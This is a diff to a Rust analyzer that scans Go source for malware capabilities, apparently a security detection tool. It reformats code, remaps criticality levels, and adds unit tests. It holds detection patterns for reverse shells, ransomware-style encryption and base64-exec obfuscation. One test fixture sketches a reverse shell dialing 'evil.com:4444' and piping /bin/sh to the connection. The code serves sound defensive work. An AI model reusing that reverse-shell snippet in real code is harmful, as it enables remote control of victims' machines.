@@ -14,16 +14,21 @@ pub struct GoAnalyzer {
 impl GoAnalyzer {
     pub fn new() -> Self {
         let mut parser = Parser::new();
-        parser.set_language(&tree_sitter_go::LANGUAGE.into()).unwrap();
+        parser
+            .set_language(&tree_sitter_go::LANGUAGE.into())
+            .unwrap();
 
-        Self { parser: RefCell::new(parser) }
+        Self {
+            parser: RefCell::new(parser),
+        }
     }
 
     fn analyze_source(&self, file_path: &Path, content: &str) -> Result<AnalysisReport> {
         let start = std::time::Instant::now();
 
         // Parse the Go source
-        let tree = self.parser
+        let tree = self
+            .parser
             .borrow_mut()
             .parse(content, None)
             .context("Failed to parse Go source")?;
@@ -73,12 +78,22 @@ impl GoAnalyzer {
         Ok(report)
     }
 
-    fn detect_capabilities(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
+    fn detect_capabilities(
+        &self,
+        node: &tree_sitter::Node,
+        source: &[u8],
+        report: &mut AnalysisReport,
+    ) {
         let mut cursor = node.walk();
         self.walk_ast(&mut cursor, source, report);
     }
 
-    fn walk_ast(&self, cursor: &mut tree_sitter::TreeCursor, source: &[u8], report: &mut AnalysisReport) {
+    fn walk_ast(
+        &self,
+        cursor: &mut tree_sitter::TreeCursor,
+        source: &[u8],
+        report: &mut AnalysisReport,
+    ) {
         loop {
             let node = cursor.node();
 
@@ -113,121 +128,308 @@ impl GoAnalyzer {
 
             // Command execution (high priority for malware)
             if text.contains("exec.Command") {
-                capabilities.push(("exec/command/shell", "Executes shell commands", "exec.Command", 0.95, Criticality::High));
+                capabilities.push((
+                    "exec/command/shell",
+                    "Executes shell commands",
+                    "exec.Command",
+                    0.95,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("syscall.Exec") || text.contains("syscall.ForkExec") {
-                capabilities.push(("exec/program/direct", "Direct program execution via syscall", "syscall.Exec", 0.98, Criticality::High));
+                capabilities.push((
+                    "exec/program/direct",
+                    "Direct program execution via syscall",
+                    "syscall.Exec",
+                    0.98,
+                    Criticality::Notable,
+                ));
             }
 
             // Reverse shell patterns (critical indicator)
-            if (text.contains("net.Dial") || text.contains("net.DialTCP")) &&
-               (text.contains("exec.Command") || text.contains("/bin/sh") || text.contains("cmd.exe")) {
-                capabilities.push(("c2/reverse-shell", "Reverse shell connection", "net.Dial+exec", 0.98, Criticality::High));
+            if (text.contains("net.Dial") || text.contains("net.DialTCP"))
+                && (text.contains("exec.Command")
+                    || text.contains("/bin/sh")
+                    || text.contains("cmd.exe"))
+            {
+                capabilities.push((
+                    "c2/reverse-shell",
+                    "Reverse shell connection",
+                    "net.Dial+exec",
+                    0.98,
+                    Criticality::Hostile,
+                ));
             }
 
             // Network operations
             if text.contains("net.Listen") || text.contains("net.ListenTCP") {
-                capabilities.push(("net/socket/server", "Network server/listener", "net.Listen", 0.9, Criticality::Medium));
+                capabilities.push((
+                    "net/socket/server",
+                    "Network server/listener",
+                    "net.Listen",
+                    0.9,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("net.Dial") {
-                capabilities.push(("net/socket/create", "Network connection", "net.Dial", 0.85, Criticality::Medium));
+                capabilities.push((
+                    "net/socket/create",
+                    "Network connection",
+                    "net.Dial",
+                    0.85,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("http.Get") || text.contains("http.Post") {
-                capabilities.push(("net/http/client", "HTTP client request", "http.Get/Post", 0.85, Criticality::Medium));
+                capabilities.push((
+                    "net/http/client",
+                    "HTTP client request",
+                    "http.Get/Post",
+                    0.85,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("http.ListenAndServe") {
-                capabilities.push(("net/http/server", "HTTP server", "http.ListenAndServe", 0.9, Criticality::Medium));
+                capabilities.push((
+                    "net/http/server",
+                    "HTTP server",
+                    "http.ListenAndServe",
+                    0.9,
+                    Criticality::Notable,
+                ));
             }
 
             // Crypto operations (ransomware indicators)
             if text.contains("aes.NewCipher") || text.contains("cipher.NewCBCEncrypter") {
-                capabilities.push(("crypto/cipher/aes", "AES encryption", "aes.NewCipher", 0.9, Criticality::High));
+                capabilities.push((
+                    "crypto/cipher/aes",
+                    "AES encryption",
+                    "aes.NewCipher",
+                    0.9,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("rsa.EncryptOAEP") || text.contains("rsa.GenerateKey") {
-                capabilities.push(("crypto/cipher/rsa", "RSA encryption", "rsa.Encrypt", 0.9, Criticality::High));
+                capabilities.push((
+                    "crypto/cipher/rsa",
+                    "RSA encryption",
+                    "rsa.Encrypt",
+                    0.9,
+                    Criticality::Notable,
+                ));
             }
             // File encryption pattern (crypto + file walking)
-            if (text.contains("aes") || text.contains("cipher")) &&
-               (text.contains("filepath.Walk") || text.contains("ioutil.ReadDir")) {
-                capabilities.push(("crypto/ransomware/encrypt", "File encryption pattern", "crypto+walk", 0.92, Criticality::High));
+            if (text.contains("aes") || text.contains("cipher"))
+                && (text.contains("filepath.Walk") || text.contains("ioutil.ReadDir"))
+            {
+                capabilities.push((
+                    "crypto/ransomware/encrypt",
+                    "File encryption pattern",
+                    "crypto+walk",
+                    0.92,
+                    Criticality::Hostile,
+                ));
             }
 
             // File operations
-            if text.contains("os.Create") || text.contains("ioutil.WriteFile") || text.contains("os.WriteFile") {
-                capabilities.push(("fs/write", "Write files", "os.Create/WriteFile", 0.8, Criticality::Low));
+            if text.contains("os.Create")
+                || text.contains("ioutil.WriteFile")
+                || text.contains("os.WriteFile")
+            {
+                capabilities.push((
+                    "fs/write",
+                    "Write files",
+                    "os.Create/WriteFile",
+                    0.8,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("os.Remove") || text.contains("os.RemoveAll") {
-                capabilities.push(("fs/delete", "Delete files/directories", "os.Remove", 0.9, Criticality::Medium));
+                capabilities.push((
+                    "fs/delete",
+                    "Delete files/directories",
+                    "os.Remove",
+                    0.9,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("filepath.Walk") || text.contains("ioutil.ReadDir") {
-                capabilities.push(("fs/enumerate", "File enumeration", "filepath.Walk", 0.75, Criticality::Low));
+                capabilities.push((
+                    "fs/enumerate",
+                    "File enumeration",
+                    "filepath.Walk",
+                    0.75,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("os.Chmod") || text.contains("os.Chown") {
-                capabilities.push(("fs/permissions", "Modify file permissions", "os.Chmod", 0.85, Criticality::Medium));
+                capabilities.push((
+                    "fs/permissions",
+                    "Modify file permissions",
+                    "os.Chmod",
+                    0.85,
+                    Criticality::Notable,
+                ));
             }
 
             // Persistence mechanisms
             if text.contains("syscall.Setuid") || text.contains("syscall.Setgid") {
-                capabilities.push(("persistence/setuid", "Change user/group ID", "syscall.Setuid", 0.95, Criticality::High));
+                capabilities.push((
+                    "persistence/setuid",
+                    "Change user/group ID",
+                    "syscall.Setuid",
+                    0.95,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("os.Symlink") {
-                capabilities.push(("persistence/symlink", "Create symbolic links", "os.Symlink", 0.8, Criticality::Medium));
+                capabilities.push((
+                    "persistence/symlink",
+                    "Create symbolic links",
+                    "os.Symlink",
+                    0.8,
+                    Criticality::Notable,
+                ));
             }
 
             // Process manipulation
             if text.contains("os.FindProcess") || text.contains("syscall.Kill") {
-                capabilities.push(("process/manipulate", "Process manipulation", "os.FindProcess", 0.85, Criticality::Medium));
+                capabilities.push((
+                    "process/manipulate",
+                    "Process manipulation",
+                    "os.FindProcess",
+                    0.85,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("runtime.SetFinalizer") {
-                capabilities.push(("process/lifecycle", "Set finalizer hooks", "runtime.SetFinalizer", 0.7, Criticality::Low));
+                capabilities.push((
+                    "process/lifecycle",
+                    "Set finalizer hooks",
+                    "runtime.SetFinalizer",
+                    0.7,
+                    Criticality::Notable,
+                ));
             }
 
             // Reflection/dynamic loading (obfuscation)
             if text.contains("reflect.ValueOf") || text.contains("reflect.Call") {
-                capabilities.push(("anti-analysis/reflection", "Reflection/dynamic invocation", "reflect.Call", 0.85, Criticality::Medium));
+                capabilities.push((
+                    "anti-analysis/reflection",
+                    "Reflection/dynamic invocation",
+                    "reflect.Call",
+                    0.85,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("plugin.Open") {
-                capabilities.push(("exec/dylib/load", "Load plugins at runtime", "plugin.Open", 0.9, Criticality::Medium));
+                capabilities.push((
+                    "exec/dylib/load",
+                    "Load plugins at runtime",
+                    "plugin.Open",
+                    0.9,
+                    Criticality::Notable,
+                ));
             }
 
             // Unsafe operations (potential exploit primitives)
             if text.contains("unsafe.Pointer") {
-                capabilities.push(("unsafe/pointer", "Unsafe pointer operations", "unsafe.Pointer", 0.8, Criticality::Medium));
+                capabilities.push((
+                    "unsafe/pointer",
+                    "Unsafe pointer operations",
+                    "unsafe.Pointer",
+                    0.8,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("syscall.Mmap") || text.contains("syscall.Mprotect") {
-                capabilities.push(("unsafe/memory-map", "Memory mapping/protection", "syscall.Mmap", 0.9, Criticality::High));
+                capabilities.push((
+                    "unsafe/memory-map",
+                    "Memory mapping/protection",
+                    "syscall.Mmap",
+                    0.9,
+                    Criticality::Notable,
+                ));
             }
 
             // Obfuscation/encoding
             if text.contains("base64.StdEncoding.DecodeString") {
-                capabilities.push(("anti-analysis/obfuscation/base64", "Base64 decoding", "base64.Decode", 0.85, Criticality::Medium));
+                capabilities.push((
+                    "anti-analysis/obfuscation/base64",
+                    "Base64 decoding",
+                    "base64.Decode",
+                    0.85,
+                    Criticality::Suspicious,
+                ));
             }
             if text.contains("hex.DecodeString") {
-                capabilities.push(("anti-analysis/obfuscation/hex", "Hex decoding", "hex.Decode", 0.8, Criticality::Low));
+                capabilities.push((
+                    "anti-analysis/obfuscation/hex",
+                    "Hex decoding",
+                    "hex.Decode",
+                    0.8,
+                    Criticality::Suspicious,
+                ));
             }
             if text.contains("gzip.NewReader") || text.contains("zlib.NewReader") {
-                capabilities.push(("anti-analysis/obfuscation/compression", "Data decompression", "gzip/zlib", 0.75, Criticality::Low));
+                capabilities.push((
+                    "anti-analysis/obfuscation/compression",
+                    "Data decompression",
+                    "gzip/zlib",
+                    0.75,
+                    Criticality::Suspicious,
+                ));
             }
 
             // CGo (can call C code - potential evasion)
             if text.contains("C.") && (text.contains("syscall") || text.contains("unsafe")) {
-                capabilities.push(("exec/cgo/unsafe", "CGo with unsafe operations", "cgo+unsafe", 0.9, Criticality::High));
+                capabilities.push((
+                    "exec/cgo/unsafe",
+                    "CGo with unsafe operations",
+                    "cgo+unsafe",
+                    0.9,
+                    Criticality::Notable,
+                ));
             }
 
             // Anti-debugging
             if text.contains("runtime.GOMAXPROCS") || text.contains("runtime.NumGoroutine") {
-                capabilities.push(("anti-analysis/environment-check", "Runtime environment checks", "runtime.GOMAXPROCS", 0.7, Criticality::Low));
+                capabilities.push((
+                    "anti-analysis/environment-check",
+                    "Runtime environment checks",
+                    "runtime.GOMAXPROCS",
+                    0.7,
+                    Criticality::Suspicious,
+                ));
             }
             if text.contains("ptrace") {
-                capabilities.push(("anti-analysis/anti-debug", "Ptrace (debugger detection)", "ptrace", 0.95, Criticality::High));
+                capabilities.push((
+                    "anti-analysis/anti-debug",
+                    "Ptrace (debugger detection)",
+                    "ptrace",
+                    0.95,
+                    Criticality::Suspicious,
+                ));
             }
 
             // Container/VM operations (cloud-native malware)
             if text.contains("docker") || text.contains("containerd") {
-                capabilities.push(("container/docker", "Docker operations", "docker", 0.8, Criticality::Medium));
+                capabilities.push((
+                    "container/docker",
+                    "Docker operations",
+                    "docker",
+                    0.8,
+                    Criticality::Notable,
+                ));
             }
             if text.contains("kubernetes") || text.contains("k8s.io") {
-                capabilities.push(("container/kubernetes", "Kubernetes API access", "k8s", 0.85, Criticality::Medium));
+                capabilities.push((
+                    "container/kubernetes",
+                    "Kubernetes API access",
+                    "k8s",
+                    0.85,
+                    Criticality::Notable,
+                ));
             }
 
             // Add all detected capabilities
@@ -247,9 +449,9 @@ impl GoAnalyzer {
                             location: Some(format!("line:{}", node.start_position().row + 1)),
                         }],
                         traits: Vec::new(),
-                    referenced_paths: None,
-                    referenced_directories: None,
-                });
+                        referenced_paths: None,
+                        referenced_directories: None,
+                    });
                 }
             }
         }
@@ -262,31 +464,41 @@ impl GoAnalyzer {
                 // Command execution
                 ("os/exec", "exec/command/shell", "Shell command execution"),
                 ("syscall", "exec/syscall", "Low-level system calls"),
-
                 // Network
                 ("net", "net/socket/create", "Network operations"),
                 ("net/http", "net/http/client", "HTTP operations"),
-
                 // Crypto (ransomware indicators when combined with file ops)
                 ("crypto/aes", "crypto/cipher/aes", "AES encryption"),
                 ("crypto/rsa", "crypto/cipher/rsa", "RSA encryption"),
                 ("crypto/cipher", "crypto/cipher", "Cryptographic ciphers"),
                 ("crypto/rand", "crypto/random", "Cryptographic random"),
-
                 // Reflection/unsafe (obfuscation/evasion)
-                ("reflect", "anti-analysis/reflection", "Reflection/introspection"),
+                (
+                    "reflect",
+                    "anti-analysis/reflection",
+                    "Reflection/introspection",
+                ),
                 ("unsafe", "unsafe/pointer", "Unsafe memory operations"),
                 ("plugin", "exec/dylib/load", "Plugin loading"),
-
                 // Encoding/obfuscation
-                ("encoding/base64", "anti-analysis/obfuscation/base64", "Base64 encoding"),
-                ("encoding/hex", "anti-analysis/obfuscation/hex", "Hex encoding"),
-                ("compress/gzip", "anti-analysis/obfuscation/compression", "Gzip compression"),
-
+                (
+                    "encoding/base64",
+                    "anti-analysis/obfuscation/base64",
+                    "Base64 encoding",
+                ),
+                (
+                    "encoding/hex",
+                    "anti-analysis/obfuscation/hex",
+                    "Hex encoding",
+                ),
+                (
+                    "compress/gzip",
+                    "anti-analysis/obfuscation/compression",
+                    "Gzip compression",
+                ),
                 // Container/cloud (cloud-native malware)
                 ("docker", "container/docker", "Docker client"),
                 ("k8s.io", "container/kubernetes", "Kubernetes client"),
-
                 // Archive (potential droppers)
                 ("archive/zip", "data/archive/zip", "ZIP archive handling"),
                 ("archive/tar", "data/archive/tar", "TAR archive handling"),
@@ -296,20 +508,21 @@ impl GoAnalyzer {
                 if text.contains(module) {
                     if !report.capabilities.iter().any(|c| c.id == cap_id) {
                         // Higher confidence for dangerous imports
-                        let confidence = if cap_id.contains("exec") ||
-                                           cap_id.contains("syscall") ||
-                                           cap_id.contains("crypto/cipher") {
+                        let confidence = if cap_id.contains("exec")
+                            || cap_id.contains("syscall")
+                            || cap_id.contains("crypto/cipher")
+                        {
                             0.85
                         } else {
                             0.7
                         };
 
                         let criticality = if cap_id.contains("exec") || cap_id.contains("syscall") {
-                            Criticality::High
+                            Criticality::Notable
                         } else if cap_id.contains("crypto") || cap_id.contains("unsafe") {
-                            Criticality::Medium
+                            Criticality::Notable
                         } else {
-                            Criticality::Low
+                            Criticality::Notable
                         };
 
                         report.capabilities.push(Capability {
@@ -326,26 +539,36 @@ impl GoAnalyzer {
                                 location: Some(format!("line:{}", node.start_position().row + 1)),
                             }],
                             traits: Vec::new(),
-                    referenced_paths: None,
-                    referenced_directories: None,
-                });
+                            referenced_paths: None,
+                            referenced_directories: None,
+                        });
                     }
                 }
             }
         }
     }
 
-    fn check_obfuscation(&self, node: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
+    fn check_obfuscation(
+        &self,
+        node: &tree_sitter::Node,
+        source: &[u8],
+        report: &mut AnalysisReport,
+    ) {
         if let Ok(text) = node.utf8_text(source) {
             // Detect base64 + exec pattern (common obfuscation)
-            if (text.contains("base64") || text.contains("DecodeString")) &&
-               (text.contains("exec.Command") || text.contains("syscall")) {
-                if !report.capabilities.iter().any(|c| c.id == "anti-analysis/obfuscation/base64-exec") {
+            if (text.contains("base64") || text.contains("DecodeString"))
+                && (text.contains("exec.Command") || text.contains("syscall"))
+            {
+                if !report
+                    .capabilities
+                    .iter()
+                    .any(|c| c.id == "anti-analysis/obfuscation/base64-exec")
+                {
                     report.capabilities.push(Capability {
                         id: "anti-analysis/obfuscation/base64-exec".to_string(),
                         description: "Base64 decode followed by exec (obfuscation)".to_string(),
                         confidence: 0.95,
-                        criticality: Criticality::High,
+                        criticality: Criticality::Suspicious,
                         mbc: None,
                         attack: None,
                         evidence: vec![Evidence {
@@ -355,20 +578,24 @@ impl GoAnalyzer {
                             location: Some(format!("line:{}", node.start_position().row + 1)),
                         }],
                         traits: Vec::new(),
-                    referenced_paths: None,
-                    referenced_directories: None,
-                });
+                        referenced_paths: None,
+                        referenced_directories: None,
+                    });
                 }
             }
 
             // Detect hex string construction (obfuscation)
             if text.contains("\\x") && text.matches("\\x").count() > 5 {
-                if !report.capabilities.iter().any(|c| c.id == "anti-analysis/obfuscation/hex-strings") {
+                if !report
+                    .capabilities
+                    .iter()
+                    .any(|c| c.id == "anti-analysis/obfuscation/hex-strings")
+                {
                     report.capabilities.push(Capability {
                         id: "anti-analysis/obfuscation/hex-strings".to_string(),
                         description: "Hex-encoded strings".to_string(),
                         confidence: 0.9,
-                        criticality: Criticality::Medium,
+                        criticality: Criticality::Suspicious,
                         mbc: None,
                         attack: None,
                         evidence: vec![Evidence {
@@ -378,20 +605,24 @@ impl GoAnalyzer {
                             location: Some(format!("line:{}", node.start_position().row + 1)),
                         }],
                         traits: Vec::new(),
-                    referenced_paths: None,
-                    referenced_directories: None,
-                });
+                        referenced_paths: None,
+                        referenced_directories: None,
+                    });
                 }
             }
 
             // Detect build tag obfuscation
             if text.contains("// +build") && (text.contains("!") || text.contains(",")) {
-                if !report.capabilities.iter().any(|c| c.id == "anti-analysis/build-tags") {
+                if !report
+                    .capabilities
+                    .iter()
+                    .any(|c| c.id == "anti-analysis/build-tags")
+                {
                     report.capabilities.push(Capability {
                         id: "anti-analysis/build-tags".to_string(),
                         description: "Conditional build tags (platform evasion)".to_string(),
                         confidence: 0.75,
-                        criticality: Criticality::Low,
+                        criticality: Criticality::Notable,
                         mbc: None,
                         attack: None,
                         evidence: vec![Evidence {
@@ -401,9 +632,9 @@ impl GoAnalyzer {
                             location: Some(format!("line:{}", node.start_position().row + 1)),
                         }],
                         traits: Vec::new(),
-                    referenced_paths: None,
-                    referenced_directories: None,
-                });
+                        referenced_paths: None,
+                        referenced_directories: None,
+                    });
                 }
             }
         }
@@ -419,7 +650,9 @@ impl GoAnalyzer {
             match current.kind() {
                 "if_statement" => complexity += 1,
                 "for_statement" => complexity += 1,
-                "switch_statement" | "expression_switch_statement" | "type_switch_statement" => complexity += 1,
+                "switch_statement" | "expression_switch_statement" | "type_switch_statement" => {
+                    complexity += 1
+                }
                 "case_clause" => complexity += 1,
                 "select_statement" => complexity += 1,
                 "binary_expression" => {
@@ -448,16 +681,22 @@ impl GoAnalyzer {
     }
 
     /// Analyze function signature for Go functions
-    fn analyze_function_signature(&self, node: &tree_sitter::Node, source: &[u8]) -> FunctionSignature {
+    fn analyze_function_signature(
+        &self,
+        node: &tree_sitter::Node,
+        _source: &[u8],
+    ) -> FunctionSignature {
         let mut param_count = 0u32;
         let mut has_return_type = false;
-        let is_method = node.kind() == "method_declaration";
+        let _is_method = node.kind() == "method_declaration";
 
         // Extract parameters
         if let Some(params_node) = node.child_by_field_name("parameters") {
             let mut param_cursor = params_node.walk();
             for child in params_node.children(&mut param_cursor) {
-                if child.kind() == "parameter_declaration" || child.kind() == "variadic_parameter_declaration" {
+                if child.kind() == "parameter_declaration"
+                    || child.kind() == "variadic_parameter_declaration"
+                {
                     param_count += 1;
                 }
             }
@@ -470,13 +709,13 @@ impl GoAnalyzer {
 
         FunctionSignature {
             param_count,
-            default_param_count: 0, // Go doesn't have default parameters
+            default_param_count: 0,    // Go doesn't have default parameters
             has_var_positional: false, // Go has variadic params but different semantics
             has_var_keyword: false,
             has_type_hints: true, // Go is statically typed
             has_return_type,
             decorators: Vec::new(), // Go doesn't have decorators
-            is_async: false, // Go uses goroutines, not async/await
+            is_async: false,        // Go uses goroutines, not async/await
             is_generator: false,
             is_lambda: false,
         }
@@ -488,12 +727,21 @@ impl GoAnalyzer {
         let mut depths = Vec::new();
         let mut deep_nest_count = 0u32;
 
-        fn traverse(node: &tree_sitter::Node, current_depth: u32, max: &mut u32,
-                    depths: &mut Vec<u32>, deep: &mut u32) {
+        fn traverse(
+            node: &tree_sitter::Node,
+            current_depth: u32,
+            max: &mut u32,
+            depths: &mut Vec<u32>,
+            deep: &mut u32,
+        ) {
             let mut depth = current_depth;
             match node.kind() {
-                "if_statement" | "for_statement" | "switch_statement" |
-                "select_statement" | "expression_switch_statement" | "type_switch_statement" => {
+                "if_statement"
+                | "for_statement"
+                | "switch_statement"
+                | "select_statement"
+                | "expression_switch_statement"
+                | "type_switch_statement" => {
                     depth += 1;
                     depths.push(depth);
                     if depth > *max {
@@ -527,7 +775,12 @@ impl GoAnalyzer {
     }
 
     /// Analyze call patterns in Go functions
-    fn analyze_call_patterns(&self, node: &tree_sitter::Node, source: &[u8], func_name: &str) -> CallPatternMetrics {
+    fn analyze_call_patterns(
+        &self,
+        node: &tree_sitter::Node,
+        source: &[u8],
+        func_name: &str,
+    ) -> CallPatternMetrics {
         let mut call_count = 0u32;
         let mut callees: Vec<String> = Vec::new();
         let mut recursive_calls = 0u32;
@@ -550,8 +803,10 @@ impl GoAnalyzer {
                         }
 
                         // Check dynamic calls (reflect.Call, plugin operations)
-                        if func_str.contains("reflect.Call") || func_str.contains("reflect.ValueOf") ||
-                           func_str.contains("plugin.Open") {
+                        if func_str.contains("reflect.Call")
+                            || func_str.contains("reflect.ValueOf")
+                            || func_str.contains("plugin.Open")
+                        {
                             dynamic_calls += 1;
                         }
                     }
@@ -626,7 +881,7 @@ impl GoAnalyzer {
                 "range_clause" => {
                     range_loop_count += 1;
                 }
-                "function_declaration" | "method_declaration" => {
+                "function_declaration" => {
                     // Check for error return type
                     if let Some(result) = node.child_by_field_name("result") {
                         if let Ok(text) = result.utf8_text(source) {
@@ -684,7 +939,12 @@ impl GoAnalyzer {
         }
     }
 
-    fn extract_functions(&self, root: &tree_sitter::Node, source: &[u8], report: &mut AnalysisReport) {
+    fn extract_functions(
+        &self,
+        root: &tree_sitter::Node,
+        source: &[u8],
+        report: &mut AnalysisReport,
+    ) {
         let mut cursor = root.walk();
 
         loop {
@@ -699,7 +959,8 @@ impl GoAnalyzer {
                         let complexity = self.calculate_cyclomatic_complexity(&node, source);
                         let signature = self.analyze_function_signature(&node, source);
                         let nesting = self.calculate_nesting_depth(&node);
-                        let call_patterns = self.analyze_call_patterns(&node, source, &func_name_str);
+                        let call_patterns =
+                            self.analyze_call_patterns(&node, source, &func_name_str);
 
                         // Extract function calls
                         let mut calls = Vec::new();
@@ -808,8 +1069,7 @@ impl Default for GoAnalyzer {
 
 impl Analyzer for GoAnalyzer {
     fn analyze(&self, file_path: &Path) -> Result<AnalysisReport> {
-        let content = fs::read_to_string(file_path)
-            .context("Failed to read Go source file")?;
+        let content = fs::read_to_string(file_path).context("Failed to read Go source file")?;
 
         self.analyze_source(file_path, &content)
     }
@@ -820,5 +1080,266 @@ impl Analyzer for GoAnalyzer {
         } else {
             false
         }
+    }
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use std::path::PathBuf;
+
+    fn analyze_go_code(code: &str) -> AnalysisReport {
+        let analyzer = GoAnalyzer::new();
+        let path = PathBuf::from("test.go");
+        analyzer.analyze_source(&path, code).unwrap()
+    }
+
+    #[test]
+    fn test_detect_exec_command() {
+        let code = r#"
+package main
+import "os/exec"
+func main() {
+    cmd := exec.Command("ls", "-la")
+    cmd.Run()
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "exec/command/shell"));
+    }
+
+    #[test]
+    fn test_detect_syscall_exec() {
+        let code = r#"
+package main
+import "syscall"
+func main() {
+    syscall.Exec("/bin/sh", []string{}, nil)
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "exec/program/direct"));
+    }
+
+    #[test]
+    fn test_detect_reverse_shell() {
+        let code = r#"
+package main
+import ("net"; "os/exec")
+func main() {
+    conn, _ := net.Dial("tcp", "evil.com:4444")
+    cmd := exec.Command("/bin/sh")
+    cmd.Stdin = conn
+}
+"#;
+        let report = analyze_go_code(code);
+        // Should detect at least net.Dial and exec.Command
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "net/socket/create"));
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "exec/command/shell"));
+    }
+
+    #[test]
+    fn test_detect_net_listen() {
+        let code = r#"
+package main
+import "net"
+func main() {
+    ln, _ := net.Listen("tcp", ":8080")
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "net/socket/server"));
+    }
+
+    #[test]
+    fn test_detect_net_dial() {
+        let code = r#"
+package main
+import "net"
+func main() {
+    conn, _ := net.Dial("tcp", "example.com:80")
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "net/socket/create"));
+    }
+
+    #[test]
+    fn test_detect_http_get() {
+        let code = r#"
+package main
+import "net/http"
+func main() {
+    resp, _ := http.Get("https://example.com")
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "net/http/client"));
+    }
+
+    #[test]
+    fn test_detect_http_server() {
+        let code = r#"
+package main
+import "net/http"
+func main() {
+    http.ListenAndServe(":8080", nil)
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "net/http/server"));
+    }
+
+    #[test]
+    fn test_detect_aes_encryption() {
+        let code = r#"
+package main
+import "crypto/aes"
+func main() {
+    key := []byte("secret")
+    block, _ := aes.NewCipher(key)
+    _ = block
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "crypto/cipher/aes"));
+    }
+
+    #[test]
+    fn test_detect_rsa_encryption() {
+        let code = r#"
+package main
+import "crypto/rsa"
+func main() {
+    key, _ := rsa.GenerateKey(rand.Reader, 2048)
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "crypto/cipher/rsa"));
+    }
+
+    #[test]
+    fn test_detect_file_write() {
+        let code = r#"
+package main
+import "os"
+func main() {
+    f, _ := os.Create("test.txt")
+    f.WriteString("data")
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report.capabilities.iter().any(|c| c.id == "fs/write"));
+    }
+
+    #[test]
+    fn test_detect_file_delete() {
+        let code = r#"
+package main
+import "os"
+func main() {
+    os.Remove("file.txt")
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report.capabilities.iter().any(|c| c.id == "fs/delete"));
+    }
+
+    #[test]
+    fn test_structural_feature() {
+        let code = "package main\nfunc main() {}";
+        let report = analyze_go_code(code);
+        assert!(report
+            .structure
+            .iter()
+            .any(|s| s.id == "source/language/go"));
+    }
+
+    #[test]
+    fn test_extract_functions() {
+        let code = r#"
+package main
+
+func hello() string {
+    return "world"
+}
+
+func main() {
+    hello()
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report.functions.len() >= 2);
+        assert!(report.functions.iter().any(|f| f.name == "hello"));
+        assert!(report.functions.iter().any(|f| f.name == "main"));
+    }
+
+    #[test]
+    fn test_multiple_capabilities() {
+        let code = r#"
+package main
+import ("os/exec"; "net/http"; "os")
+
+func main() {
+    exec.Command("whoami").Run()
+    http.Get("https://evil.com")
+    os.Remove("/tmp/file")
+}
+"#;
+        let report = analyze_go_code(code);
+        assert!(report.capabilities.len() >= 3);
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "exec/command/shell"));
+        assert!(report
+            .capabilities
+            .iter()
+            .any(|c| c.id == "net/http/client"));
+        assert!(report.capabilities.iter().any(|c| c.id == "fs/delete"));
+    }
+
+    #[test]
+    fn test_can_analyze_go_extension() {
+        let analyzer = GoAnalyzer::new();
+        let path = PathBuf::from("test.go");
+        assert!(analyzer.can_analyze(&path));
+    }
+
+    #[test]
+    fn test_cannot_analyze_other_extension() {
+        let analyzer = GoAnalyzer::new();
+        let path = PathBuf::from("test.txt");
+        assert!(!analyzer.can_analyze(&path));
     }
 }
